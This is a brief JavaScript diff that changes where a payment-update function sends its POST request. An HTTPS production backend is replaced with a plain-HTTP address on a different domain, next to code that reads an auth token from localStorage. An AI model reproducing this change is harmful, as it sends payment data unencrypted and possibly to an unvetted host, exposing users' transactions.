@@ -5,7 +5,7 @@ const auth_token = localStorage.getItem("auth_token");
 
 async function updateTransaction(code) {
     const response = await fetch(
-      "https://arobobackend-production.up.railway.app/api/payment/update",
+      "http://srvcprvdr.agsys.online/api/payment/update",
       {
         method: "POST",
         body: JSON.stringify({ code }),
